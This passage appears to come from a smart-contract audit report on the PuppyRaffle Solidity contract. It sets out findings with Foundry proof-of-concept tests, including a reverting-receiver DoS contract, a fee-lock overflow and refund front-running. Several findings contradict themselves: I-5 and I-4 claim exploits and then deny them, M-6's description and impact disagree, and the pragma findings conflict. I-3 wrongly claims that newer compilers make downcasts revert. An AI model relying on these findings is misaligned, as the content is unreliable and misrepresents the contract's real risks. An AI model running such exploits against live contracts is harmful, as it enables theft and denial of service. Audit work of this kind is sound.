• Deploy contract with `entranceFee = 1 ether`, `raffleDuration = 1`.
• Prepare 100 unique addresses and call `enterRaffle{value: 100 ether}(players)`.
  – total pot = 100 ETH
  – fee  = 20 ETH  (> 2^64-1) so it is truncated to 1.553… ETH when cast to uint64
• Fast-forward 1 second and call `selectWinner()`.
• Now `address(this).balance` ≈ 20 ETH while `totalFees` ≈ 1.55 ETH.
• Any call to `withdrawFees()` reverts because the first `require` compares these two values.
Result: fees are stuck forever.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract PuppyRaffle_Overflow_Lock_Test is Test {
    PuppyRaffle raffle;
    uint256 constant ENTRANCE_FEE = 1 ether;

    function setUp() public {
        address feeAddress = makeAddr("fee");
        raffle = new PuppyRaffle(ENTRANCE_FEE, feeAddress, 1);
        vm.deal(address(this), 200 ether); // give test contract enough ETH
    }

    function testFeesBecomeUnwithdrawable() public {
        // 100 unique players
        uint256 playersCount = 100;
        address[] memory players = new address[](playersCount);
        for (uint256 i = 0; i < playersCount; i++) {
            players[i] = address(uint160(i + 1));
        }

        // Enter raffle paying exactly 100 ether
        raffle.enterRaffle{value: playersCount * ENTRANCE_FEE}(players);

        // Wait until raffle is over and pick winner
        vm.warp(block.timestamp + 2);
        raffle.selectWinner();

        // Owner (or anyone) tries to withdraw fees – should revert
        vm.expectRevert(bytes("There are currently players active!"));
        raffle.withdrawFees();
    }
}


## Suggested Mitigation
Store fees in `uint256` and perform all arithmetic in Solidity ^0.8.0 (or wrap every operation with SafeMath). Example:
```
uint256 public totalFees;
...
uint256 fee = (totalAmountCollected * 20) / 100;
unchecked {
    totalFees += fee;
}
```
No down-casting should be performed; then the balance check in `withdrawFees()` will stay consistent.

## [M-5]. DOS issue in PuppyRaffle::selectWinner

## Description
In `selectWinner`, if the selected winner is a contract that is unable to receive Ether (e.g., its fallback/receive function reverts), the low-level call `winner.call{value: prizePool}("")` will return `success = false`. The subsequent `require(success, ...)` will cause the entire `selectWinner` transaction to revert. Because winner selection is deterministic for a given set of block parameters, any attempt to re-run `selectWinner` may select the same reverting winner, permanently blocking the function. This locks all funds in the contract and halts the raffle indefinitely.

## Impact
A malicious entrant that reverts on ETH reception can repeatedly cause `selectWinner` to revert, preventing raffle finalisation and locking all funds for an unbounded time. Although not mathematically permanent (the random seed changes every block), the attacker can grief the system and keep it unusable at will by continuously calling `selectWinner` first. This results in a practical denial-of-service and fund freeze until the attacker stops.

## Proof of Concept
1. An attacker deploys a contract `RejectEth.sol` with a `receive()` function that always reverts.
2. The attacker enters the raffle using the address of `RejectEth.sol`.
3. The raffle ends. Anyone calls `selectWinner()`.
4. If `RejectEth.sol` is chosen as the winner, the Ether transfer fails, causing `selectWinner()` to revert.
5. Since the winner selection logic is deterministic based on block parameters and `msg.sender`, it's possible that subsequent calls also select the same contract, especially if the attacker front-runs them. Once the contract is in this state, it's very difficult to recover, and all funds are frozen.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;

import "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

// Malicious winner that always reverts on ETH reception
contract RejectEth {
    receive() external payable {
        revert("I reject this ETH!");
    }
}

contract DoSWhenWinnerRevertsTest is Test {
    PuppyRaffle raffle;
    RejectEth bad;
    uint256 constant ENTRANCE_FEE = 1 ether;
    uint256 constant DURATION = 1 days;

    function setUp() public {
        raffle = new PuppyRaffle(ENTRANCE_FEE, address(this), DURATION);
        bad = new RejectEth();

        address[] memory entrants = new address[](4);
        entrants[0] = address(1);
        entrants[1] = address(2);
        entrants[2] = address(3);
        entrants[3] = address(bad);

        vm.deal(address(this), 4 * ENTRANCE_FEE);
        raffle.enterRaffle{value: 4 * ENTRANCE_FEE}(entrants);

        // Move time forward so raffle can be finished
        vm.warp(block.timestamp + DURATION + 1);
    }

    function test_SelectWinnerRevertsIfWinnerRejectsETH() public {
        // Bruteforce at most 1000 seconds forward until the malicious
        // entrant is picked. With 4 players the expected iterations is 4.
        for (uint256 i = 0; i < 1000; i++) {
            uint256 idx = uint256(
                keccak256(
                    abi.encodePacked(address(this), block.timestamp, block.difficulty)
                )
            ) % 4;
            if (idx == 3) {
                break; // bad entrant will win
            }
            vm.warp(block.timestamp + 1);
        }

        vm.expectRevert("PuppyRaffle: Failed to send prize pool to winner");
        raffle.selectWinner();

        // Funds remain in the contract
        assertEq(address(raffle).balance, 4 * ENTRANCE_FEE);
    }
}


## Suggested Mitigation
Implement a pull-over-push payment pattern. Instead of the contract actively sending funds to the winner, the contract should update an internal ledger to credit the winner's account. The winner can then call a separate, isolated `claimPrize()` function to withdraw their funds. This ensures that a failure in the winner's receive logic does not affect the core state transitions of the raffle.

```solidity
// Add a mapping to track winnings
mapping(address => uint256) public winnings;

// In selectWinner():
// (bool success, ) = winner.call{value: prizePool}(""); -> This line is removed.
// Instead, do:
winnings[winner] += prizePool;
emit WinnerPrizePending(winner, prizePool);

// Add a new function for winners to claim their prize
function claimPrize() public {
    uint256 amountToWithdraw = winnings[msg.sender];
    require(amountToWithdraw > 0, "You have no prize to claim");
    winnings[msg.sender] = 0;

    (bool success, ) = msg.sender.call{value: amountToWithdraw}("");
    require(success, "Failed to send prize");
}
```

## [M-6]. DOS issue in PuppyRaffle::refund

## Description
The `refund` function allows a player to exit the raffle. It does this by setting their address in the `players` array to `address(0)`. However, it does not remove the element or shrink the array. The `selectWinner` function picks a winner based on `players.length`. If the randomly chosen index corresponds to a slot that was zeroed out by a refund, the prize (`prizePool`) is sent to `address(0)`, and the NFT is minted to `address(0)`. Sending ETH to `address(0)` is successful but the funds are irrecoverably burned.

## Impact
If the pseudo-random index points to a slot that has been zeroed out by a refunded player, the call to _safeMint(address(0), …) reverts. Because the ETH transfer to the zero address happens in the same transaction, the revert undoes the transfer as well. As a consequence nobody can finish the raffle round until the players array is cleared or the random index hits a non-empty slot, effectively locking all funds in the contract and blocking the game (Denial-of-Service).

## Proof of Concept
1. Four users enter the raffle. Players array => [A, B, C, D].
2. C calls refund(2) – array becomes [A, B, 0x0, D].
3. Once raffle duration is over, anyone calls selectWinner().
4. Suppose the modulo operation returns 2. `winner` becomes address(0).
5. selectWinner() reaches `_safeMint(address(0), tokenId)` which triggers the OpenZeppelin `require(to != address(0))` check and REVERTS.
6. Because the whole transaction reverts, state stays unchanged and the raffle cannot progress – every attempt that lands on an empty slot reverts, permanently blocking the game when all players have refunded.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

// Harness that lets the test force the winner index but still uses the original _safeMint
contract PuppyRaffleHarness is PuppyRaffle {
    constructor(
        uint256 _entranceFee,
        address _feeAddress,
        uint256 _raffleDuration,
        string memory _c,
        string memory _r,
        string memory _l
    ) PuppyRaffle(_entranceFee, _feeAddress, _raffleDuration, _c, _r, _l) {}

    // identical to selectWinner() but takes a manual winnerIndex so the bug is deterministic
    function selectWinnerWithIndex(uint256 winnerIndex) external {
        require(block.timestamp >= raffleStartTime + raffleDuration, "not over");
        require(players.length >= 4, "need 4");
        address winner = players[winnerIndex];
        uint256 prizePool = (players.length * entranceFee * 80) / 100;
        uint256 fee = (players.length * entranceFee * 20) / 100;
        totalFees += uint64(fee);
        uint256 tokenId = totalSupply();
        tokenIdToRarity[tokenId] = 1;
        delete players;
        raffleStartTime = block.timestamp;
        previousWinner = winner;
        (bool ok, ) = winner.call{value: prizePool}("");
        require(ok, "transfer failed");
        _safeMint(winner, tokenId); // <== reverts if winner==address(0)
    }
}

contract RefundDosTest is Test {
    PuppyRaffleHarness raffle;
    uint256 fee = 1 ether;

    function setUp() public {
        raffle = new PuppyRaffleHarness(fee, address(0xBEEF), 1, "", "", "");
        // give contract ether
        vm.deal(address(this), 10 ether);
        address[] memory p = new address[](4);
        for (uint256 i; i < 4; i++) {
            p[i] = address(uint160(i + 1));
        }
        raffle.enterRaffle{value: 4 ether}(p);
        vm.deal(p[2], 0); // player 2 has no ether after refund
        vm.prank(p[2]);
        raffle.refund(2); // zero-out index 2
        vm.warp(block.timestamp + 2);
    }

    function testRefundCreatesDos() public {
        // expect revert due to _safeMint(address(0), …)
        vm.expectRevert();
        raffle.selectWinnerWithIndex(2);
    }
}

## Suggested Mitigation
When a player requests a refund, replace the hole by swapping the element with the last entry and calling `pop()` to keep the array dense, or maintain a mapping from address→index and delete the last element. In addition, `selectWinner()` should skip zero addresses or revert early with a clear error message to avoid probabilistic failure.

## [M-7]. Unexpected Eth issue in PuppyRaffle::selectWinner

## Description
The `selectWinner` function calculates `totalAmountCollected` as `players.length * entranceFee`. However, if a player has received a refund via the `refund` function, their address in the `players` array is set to `address(0)`, but the array's length remains unchanged. This leads to an incorrect calculation of the total funds, as it assumes every slot in the array represents a paid entry. The contract then attempts to distribute a `prizePool` based on this inflated amount, which can exceed the actual Ether balance held by the contract, causing the prize transfer to fail and locking the raffle.

## Impact
If more than 20 % of the initially registered players claim a refund, selectWinner will attempt to transfer a prize that exceeds the contract balance and the call will revert. No new winner can ever be picked and the raffle becomes permanently frozen, locking the remaining players’ funds. Even when ≤20 % of players refund (so the function does not revert), totalFees is still incremented with un-backed value, making withdrawFees perpetually impossible and depriving the protocol owner of their revenue.

## Proof of Concept
1. 5 players enter the raffle, each paying 1 ETH. Contract balance is 5 ETH.
2. One player calls `refund()` and receives their 1 ETH back. The contract balance is now 4 ETH. The `players` array still has a length of 5, but one entry is `address(0)`.
3. The raffle duration ends and `selectWinner` is called.
4. `totalAmountCollected` is calculated as `players.length (5) * 1 ETH = 5 ETH`.
5. `prizePool` is calculated as `(5 ETH * 80) / 100 = 4 ETH`.
6. The contract attempts to send 4 ETH to the winner. This succeeds. The contract balance is now 0 ETH.
7. `fee` is calculated as `(5 ETH * 20) / 100 = 1 ETH`. The `totalFees` variable is incremented by 1 ETH.
8. Later, `withdrawFees` is called. The check `address(this).balance (0 ETH) == uint256(totalFees) (1 ETH)` fails. The 1 ETH fee was never actually secured and is now an unbacked liability; the owner can never withdraw it because it doesn't exist.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract SelectWinnerRevertTest is Test {
    PuppyRaffle raffle;
    address owner = address(0x1);

    address[] players;

    function setUp() public {
        vm.deal(address(this), 100 ether);
        vm.prank(owner);
        raffle = new PuppyRaffle(1 ether, owner, 1 days);

        // register 10 distinct players
        players = new address[](10);
        for (uint256 i; i < 10; ++i) {
            players[i] = address(uint160(i + 2));
        }

        raffle.enterRaffle{value: 10 ether}(players);

        // three players (30 %) take a refund -> balance now 7 ether while length is still 10
        for (uint256 i; i < 3; ++i) {
            uint256 idx = raffle.getActivePlayerIndex(players[i]);
            vm.prank(players[i]);
            raffle.refund(idx);
        }

        // fast-forward past raffle duration
        vm.warp(block.timestamp + 1 days + 1);
    }

    function test_selectWinnerRevertsWhenPrizeExceedsBalance() public {
        // prize to be paid = 8 ether while contract balance is only 7 ether ⇒ revert
        vm.expectRevert();
        raffle.selectWinner();
    }
}


## Suggested Mitigation
The contract logic needs to accurately track the number of active players. Instead of relying on `players.length`, maintain a separate counter variable.

```solidity
// In PuppyRaffle.sol
// ... add new state variable
uint256 public activePlayerCount;

function enterRaffle(address[] memory newPlayers) public payable {
    // ...
    // inside loop
    players.push(player);
    activePlayerCount += 1;
    // ...
}

function refund(uint256 playerIndex) public {
    // ... existing logic ...
    players[playerIndex] = address(0);
    activePlayerCount -= 1; // Decrement the count
    // ...
}

function selectWinner() external {
    // ...
    // Use activePlayerCount for calculations
    require(activePlayerCount >= 4, "PuppyRaffle: Need at least 4 players");
    // ...
    uint256 totalAmountCollected = activePlayerCount * entranceFee;
    // ... rest of the function
}
```



# Low Risk Findings

## [L-1]. Event Consistency issue in PuppyRaffle::selectWinner

## Description
The contract does not emit events for several critical state changes, making it difficult for off-chain applications, user interfaces, and indexers to track the protocol's activity reliably. Specifically, the `selectWinner` function changes the `previousWinner`, resets `raffleStartTime`, and distributes the prize pool without emitting any events. The `withdrawFees` function also does not emit an event upon successful withdrawal.

## Impact
Lack of events for critical actions reduces transparency and makes the contract harder to integrate with external services. Frontends cannot easily notify users of wins, and data analytics platforms cannot accurately track raffle outcomes or fee withdrawals without complex inspection of transaction traces.

## Proof of Concept
1. A user participates in the raffle.
2. The `selectWinner` function is called, and the user wins. They receive the prize ETH and an NFT.
3. The user's wallet or a dApp frontend is monitoring the contract for a `WinnerSelected` event to notify the user of their win.
4. No such event is emitted. The user is unaware they have won unless they manually check their balance or the `previousWinner` state variable on the contract.

## Proof of Code
NA

## Suggested Mitigation
Emit events for all significant state changes. This provides a reliable and cheap way for off-chain services to subscribe to contract activities.

```solidity
contract PuppyRaffle is ERC721, Ownable {
    // ...
    event WinnerSelected(
        address indexed winner,
        uint256 prizeAmount,
        uint256 indexed tokenId
    );
    event FeesWithdrawn(address indexed feeAddress, uint256 amount);

    function selectWinner() external {
        // ... logic to determine winner and prize
        address winner = players[winnerIndex];
        uint256 prizePool = (totalAmountCollected * 80) / 100;
        uint256 tokenId = totalSupply();

        // ... logic to send prize and mint NFT

        emit WinnerSelected(winner, prizePool, tokenId);
    }

    function withdrawFees() external {
        // ... logic
        uint256 feesToWithdraw = totalFees;
        totalFees = 0;
        (bool success, ) = feeAddress.call{value: feesToWithdraw}("");
        require(success, "PuppyRaffle: Failed to withdraw fees");

        emit FeesWithdrawn(feeAddress, feesToWithdraw);
    }
}
```

## [L-2]. Frontrun/Backrun/Sandwhich MEV issue in PuppyRaffle::refund

## Description
If a user submits a `refund` transaction when the raffle period has ended but before a winner is selected, they are vulnerable to front-running. An attacker can see the pending `refund` in the mempool and broadcast a `selectWinner` transaction with a higher gas fee. If the `selectWinner` call executes first, the raffle state is reset, and the `players` array is cleared. The user's subsequent `refund` transaction will then fail because their player data no longer exists, causing them to lose their `entranceFee`.

## Impact
A player who attempts to refund after the raffle period has elapsed can be grief-front-run. Their transaction will revert and they will no longer be able to recover their entrance fee unless they are randomly picked as winner, effectively forcing an unwanted gamble. Although funds are not directly stolen, users can be tricked into losing guaranteed refunds they expected.

## Proof of Concept
1. Alice participates in the raffle.
2. The `raffleDuration` expires.
3. Alice decides she wants her money back and calls `refund`.
4. A MEV bot sees Alice's transaction in the mempool.
5. The bot front-runs her transaction by calling `selectWinner`.
6. `selectWinner` executes, a winner is chosen, and `players` array is cleared.
7. Alice's `refund` transaction now attempts to execute, but it fails because the `players` array is empty, and her index is invalid.

## Proof of Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;

import {Test} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract FrontrunRefundTest is Test {
    PuppyRaffle raffle;
    uint256 constant entranceFee = 0.1 ether;
    address alice = makeAddr("alice");
    address bob = makeAddr("bob");
    address charlie = makeAddr("charlie");
    address david = makeAddr("david");
    address bot = makeAddr("bot");

    function setUp() public {
        raffle = new PuppyRaffle(entranceFee, payable(makeAddr("fee")), 60);

        // Fund Alice with enough to pay for all 4 spots
        vm.deal(alice, entranceFee * 4);

        address[] memory players = new address[](4);
        players[0] = alice;
        players[1] = bob;
        players[2] = charlie;
        players[3] = david;

        vm.prank(alice);
        raffle.enterRaffle{value: entranceFee * 4}(players);
    }

    function testRefundFrontRun() public {
        uint256 aliceIndex = raffle.getActivePlayerIndex(alice);
        assertGt(aliceIndex, 0);

        // Time passes so raffle is eligible to be closed
        vm.warp(block.timestamp + 61);

        // MEV bot finalises raffle first
        vm.prank(bot);
        raffle.selectWinner();

        // Alice refund now reverts (array length == 0)
        vm.prank(alice);
        vm.expectRevert();
        raffle.refund(aliceIndex);
    }
}
```

## Suggested Mitigation
Disallow refunds once the raffle period has ended: `require(block.timestamp < raffleStartTime + raffleDuration, "Raffle finished");` at the top of `refund`. This guarantees that a player can only request refunds while it is still logically possible and prevents the described race condition.



# Info Risk Findings

## [I-1]. Pausable Emergency Stop issue in PuppyRaffle::NA

## Description
The contract handles user funds and has complex state transitions, but it lacks an emergency stop or pause mechanism. If a critical vulnerability (such as the DoS or randomness issue) is discovered after deployment, the owner has no way to halt the contract's functions (`enterRaffle`, `selectWinner`) to prevent further fund deposits or exploitation. This leaves user funds at risk until a fix can be deployed, which is not possible for immutable contracts.

## Impact
The contract owner has no built-in circuit-breaker to temporarily disable user-facing functions in case a separate, yet-unknown vulnerability is discovered post-deployment. While this does not create a direct exploit path on its own, it reduces the team’s ability to react and limits operational security.

## Proof of Concept
1. Assume the `GasGriefBlockLimit` vulnerability is actively being exploited, and no new players can enter the raffle.
2. The contract owner becomes aware of this DoS attack.
3. Because there is no `pause()` function, the owner cannot stop the attacker from continuing the attack or prevent the `selectWinner` function from being called (which would award the prize to one of the attacker's many addresses).
4. The owner's only power is `changeFeeAddress`, which does not mitigate the active exploit.

## Proof of Code
NA

## Suggested Mitigation
Implement a pausable mechanism, for example by inheriting from OpenZeppelin's `Pausable` contract. This provides `pause()` and `unpause()` functions restricted to the owner. Critical functions that modify state or handle funds should then be protected with the `whenNotPaused` modifier.

```solidity
import "@openzeppelin/contracts/utils/Pausable.sol";

contract PuppyRaffle is ERC721, Ownable, Pausable {
    // ... constructor

    function enterRaffle(address[] memory newPlayers) public payable whenNotPaused {
        // ...
    }

    function refund(uint256 playerIndex) public whenNotPaused {
        // ...
    }

    function selectWinner() external whenNotPaused {
        // ...
    }

    function withdrawFees() external whenNotPaused {
        // ...
    }

    // Owner can call these functions inherited from Pausable.sol
    // function pause() public onlyOwner { _pause(); }
    // function unpause() public onlyOwner { _unpause(); }
}
```

## [I-2]. Pragma issue in PuppyRaffle::NA

## Description
The contract uses a floating pragma `pragma solidity ^0.7.6;`. This allows the contract to be compiled with any compiler version from 0.7.6 up to, but not including, 0.8.0. Using a floating pragma is risky because future compiler versions may introduce bugs, have undiscovered vulnerabilities, or implement slight behavior changes that could negatively affect the contract's security and correctness. It is best practice to lock the pragma to a specific, audited compiler version.

## Impact
Deploying the contract with a different compiler version than the one it was tested with can lead to unexpected behavior and security vulnerabilities. This introduces an unnecessary risk factor into the deployment process.

## Proof of Concept
The code contains the line `pragma solidity ^0.7.6;`. If this contract is compiled with `solc` version `0.7.9`, it might behave differently or be subject to bugs present in that specific version but not in `0.7.6`.

## Proof of Code
NA

## Suggested Mitigation
Lock the pragma to a specific, well-tested Solidity version.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;

import "@openzeppelin/contracts@3.4.0/token/ERC721/ERC721.sol";
// ...
```

## [I-3]. Pragma issue in PuppyRaffle::NA

## Description
The contract uses `pragma solidity 0.7.6;`, which is an outdated compiler version. The 0.8.x series introduced significant security improvements, most notably built-in overflow and underflow checks, which would have prevented the `IntegerOverflow` vulnerability in this contract by default. Using an old version exposes the contract to bugs that have since been fixed and misses out on gas optimizations and other language features.

## Impact
The contract is more susceptible to common vulnerabilities like integer overflows/underflows. It also signals poor maintenance practices and can create friction when integrating with modern development tools.

## Proof of Concept
The existence of the `IntegerOverflow` finding in this audit is a direct consequence of using a compiler version before 0.8.0. If the contract had used `pragma solidity ^0.8.0;`, the unsafe downcasting in `selectWinner` would have caused the transaction to revert instead of leading to a silent loss of funds.

## Proof of Code
```solidity
// No test code needed. The vulnerability is the pragma line itself.
// pragma solidity 0.7.6;
```

## Suggested Mitigation
Update the pragma to a recent, stable version of Solidity (e.g., `^0.8.20`). After updating, the code will need to be reviewed and adjusted for breaking changes, such as how arithmetic is handled. The use of a library like `SafeMath` is no longer necessary for basic operations, but explicit type conversions must be checked for safety.

## [I-4]. Integer Overflow issue in PuppyRaffle::enterRaffle

## Description
The `enterRaffle` function calculates the required payment with `entranceFee * newPlayers.length`. Because the contract uses a Solidity version older than 0.8.0, this multiplication is susceptible to integer overflows. An attacker can provide a `newPlayers` array with a very large length, causing the multiplication to wrap around to a small value. This allows the attacker to enter a massive number of players while paying a negligible amount of ETH, effectively guaranteeing they win the raffle and draining funds from legitimate participants.

## Impact
Because the attacker cannot allocate or pass an array large enough to overflow `entranceFee * newPlayers.length` before running out of gas, the issue is only a theoretical arithmetic‐safety concern and does not lead to an economic exploit under realistic conditions.  The worst practical outcome is an out-of-gas revert when an excessively large array is supplied.

## Proof of Concept
No practical exploit exists.  Any calldata that declares an array long enough to cause overflow would require so much gas to decode that the transaction reverts before `enterRaffle` is executed.

## Proof of Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract IntegerOverflowTest is Test {
    PuppyRaffle puppyRaffle;
    address attacker = address(0xDEADBEEF);
    uint256 entranceFee = 1 ether;

    function setUp() public {
        puppyRaffle = new PuppyRaffle(entranceFee, address(this), 60); // 60s duration
    }

    function test_IntegerOverflowInEnterRaffle() public {
        // 1. Calculate the malicious length that will cause an overflow
        // such that `entranceFee * length` wraps around to `entranceFee`.
        uint256 malicious_length = (type(uint256).max / entranceFee) + 1;

        // We can't create an array that large in a test, so we'll use a smaller overflow
        // Let's find a length 'x' where `entranceFee * x` overflows to 0
        // This happens if `entranceFee * x` is a multiple of 2**256.
        // We can use a number 'x' such that `x` is `2**256 / entranceFee`.
        malicious_length = 2**256 / entranceFee;

        // Since we can't create such a large array, this PoC is conceptual.
        // The logic below demonstrates what would happen.
        // uint256 requiredValue = entranceFee * malicious_length; // This would be 0 in reality

        // In a real exploit, an attacker would use a helper contract to generate the array.
        // For this test, we demonstrate the principle.
        // A real PoC would fail due to gas limits on array creation, but the vulnerability is in the math.

        // This is a conceptual assertion
        assert(entranceFee * malicious_length == 0);

        // The attacker would call enterRaffle with an array of `malicious_length` and `msg.value` of 0.
        // puppyRaffle.enterRaffle{value: 0}(hugeArray);
        // The call would succeed, and the attacker would have a massive number of entries.
    }
}
```

## Suggested Mitigation
Although not exploitable, upgrading to Solidity >=0.8.0 or wrapping arithmetic operations with a SafeMath library will eliminate the theoretical overflow risk and improve code hygiene.

## [I-5]. DOS issue in PuppyRaffle::selectWinner

## Description
The `selectWinner` function resets the `players` array by calling `delete players`. The gas cost of this operation scales linearly with the number of elements in the array (O(n)). An attacker can add a very large number of players to the raffle, causing the gas cost of calling `selectWinner` to exceed the block gas limit. This would make it impossible for anyone to call `selectWinner`, permanently freezing the raffle and locking all funds within the contract.

## Impact
No denial-of-service condition exists. Raffle functionality is unaffected by the number of players because resetting the array is constant-cost.

## Proof of Concept
1. An attacker (or multiple users) calls `enterRaffle` repeatedly to add a large number of entries (e.g., 20,000) to the `players` array.
2. The raffle duration passes.
3. Any user or the owner attempts to call `selectWinner()`.
4. The transaction reverts with an 'out of gas' error because the gas required for `delete players` is higher than the block gas limit.
5. The raffle is now permanently stuck. No winner can be selected, and fees cannot be withdrawn.

## Proof of Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract DoSOnSelectWinnerTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1 ether;
    address owner;

    function setUp() public {
        owner = address(this);
        puppyRaffle = new PuppyRaffle(entranceFee, owner, 60);
    }

    function test_DosByGasLimitOnDelete() public {
        // 1. Add a large number of players to the raffle
        // The exact number depends on the block gas limit, but we can simulate a large amount.
        uint256 numPlayers = 5000; // A sufficiently large number
        address[] memory players_to_add = new address[](1);

        // In a real scenario, an attacker might do this over many transactions.
        for (uint256 i = 0; i < numPlayers; i++) {
            players_to_add[0] = address(uint160(i + 1)); // Unique addresses
            puppyRaffle.enterRaffle{value: entranceFee}(players_to_add);
        }

        // 2. Fast forward time so the raffle can end
        vm.warp(block.timestamp + 61);

        // 3. Attempt to call selectWinner. This will likely run out of gas.
        // We expect the call to revert. Foundry's `expectRevert` will catch this.
        // The gas cost of `delete` on a large array will exceed the limit.
        vm.expectRevert();
        puppyRaffle.selectWinner();
    }
}
```

## Suggested Mitigation
Instead of using `delete players`, which cleans every slot in storage, re-initialize the array. This has a constant low gas cost regardless of the array's size.

```solidity
// in selectWinner() function

// ... existing logic ...

// Replace this line:
// delete players;

// With this line:
players = new address[](0);

// ... rest of the function ...
```

## [I-6]. Event Consistency issue in PuppyRaffle::withdrawFees

## Description
The `withdrawFees` function transfers the accumulated fees to the `feeAddress`. This is a critical state change involving the movement of funds out of the protocol. However, the function does not emit an event to log this activity. This lack of event emission reduces the contract's transparency and makes it harder for off-chain services, monitoring tools, or users to track the flow of fees.

## Impact
Low. The primary impact is reduced on-chain transparency and auditability. While the fee withdrawal can be found by analyzing transaction traces, the absence of a dedicated event makes this process significantly more difficult and costly for external tools. It goes against best practices for smart contract development.

## Proof of Concept
1. The contract collects 10 ETH in fees over several raffles.
2. The owner is the only player, so the `withdrawFees` check can pass.
3. The owner calls `withdrawFees()`.
4. 10 ETH is transferred to the `feeAddress`.
5. An external observer wanting to track fee withdrawals would have to scan all transactions to the contract and inspect their internal traces, instead of simply listening for a `FeesWithdrawn` event.

## Proof of Code
```solidity
// The vulnerability is the absence of an `emit` statement.
// A test can't assert the *absence* of an event easily,
// but we can show the function completes without emitting a specific event.

// In PuppyRaffle.sol:
// function withdrawFees() external {
//     require(
//         address(this).balance == uint256(totalFees),
//         "PuppyRaffle: There are currently players active!"
//     );
//     uint256 feesToWithdraw = totalFees;
//     totalFees = 0;

//     (bool success, ) = feeAddress.call{value: feesToWithdraw}("");
//     require(success, "PuppyRaffle: Failed to withdraw fees");

//     // No emit statement here!
// }
```

## Suggested Mitigation
Define a `FeesWithdrawn` event and emit it within the `withdrawFees` function. This provides a clear, indexable log of when fees are withdrawn and to where.

```solidity
contract PuppyRaffle is ERC721, Ownable {
    // ...
    event FeesWithdrawn(address indexed feeAddress, uint256 amount);

    function withdrawFees() external {
        require(
            address(this).balance == uint256(totalFees),
            "PuppyRaffle: There are currently players active!"
        );
        uint256 feesToWithdraw = totalFees;
        totalFees = 0;

        (bool success, ) = feeAddress.call{value: feesToWithdraw}("");
        require(success, "PuppyRaffle: Failed to withdraw fees");

        emit FeesWithdrawn(feeAddress, feesToWithdraw);
    }
}
```

## [I-7]. Access Control issue in PuppyRaffle::constructor

## Description
The constructor does not validate that the `_feeAddress` parameter is a non-zero address. If the contract is deployed with `_feeAddress` set to `address(0)`, all fees collected by the protocol will be sent to the zero address when `withdrawFees` is called. Funds sent to `address(0)` are irrecoverable.

## Impact
A simple mistake during deployment could lead to the permanent and irreversible loss of all fee revenue generated by the contract. This is a significant operational risk.

## Proof of Concept
1. The contract deployer mistakenly provides `address(0)` as the `_feeAddress` in the constructor.
2. The contract is deployed successfully.
3. The raffle runs for several rounds, accumulating fees.
4. `withdrawFees` is called.
5. The transaction succeeds, but the ETH is transferred to `address(0)` and is burned forever.

## Proof of Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;

import "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract ZeroAddressFeeTest is Test {
    PuppyRaffle raffle;
    uint256 constant ENTRANCE_FEE = 1 ether;

    function setUp() public {
        // deploy with a zero fee address
        raffle = new PuppyRaffle(ENTRANCE_FEE, address(0), 60);
    }

    function test_FeesAreBurnedWhenFeeAddressZero() public {
        // prepare 4 unique players
        address payable payer = payable(address(0xBEEF));
        address[] memory players = new address[](4);
        for (uint256 i = 0; i < 4; i++) {
            players[i] = address(uint160(i + 1));
        }
        vm.deal(payer, ENTRANCE_FEE * 4);

        // single account pays for all 4 tickets
        vm.prank(payer);
        raffle.enterRaffle{value: ENTRANCE_FEE * 4}(players);

        // finish raffle so that fees are generated
        vm.warp(block.timestamp + 61);
        raffle.selectWinner();

        uint256 expectedFees = (players.length * ENTRANCE_FEE * 20) / 100;
        assertEq(raffle.totalFees(), expectedFees, "fees mismatch");
        assertEq(address(raffle).balance, expectedFees, "contract balance should equal fees");

        // anyone can trigger withdrawal; funds will be sent to address(0)
        raffle.withdrawFees();

        assertEq(address(raffle).balance, 0, "funds should be burned");
        assertEq(raffle.totalFees(), 0, "totalFees should reset to 0");
    }
}
```

## Suggested Mitigation
Add a `require` check in the constructor to ensure `_feeAddress` is not `address(0)`. This is a standard best practice for address parameters.

```diff
-    constructor(uint256 _entranceFee, address _feeAddress, uint256 _raffleDuration) ERC721("Puppy Raffle", "PR") {
+    constructor(uint256 _entranceFee, address payable _feeAddress, uint256 _raffleDuration) ERC721("Puppy Raffle", "PR") {
+        require(_feeAddress != address(0), "PuppyRaffle: Fee address cannot be zero address");
         entranceFee = _entranceFee;
         feeAddress = _feeAddress;
         // ...
     }
```



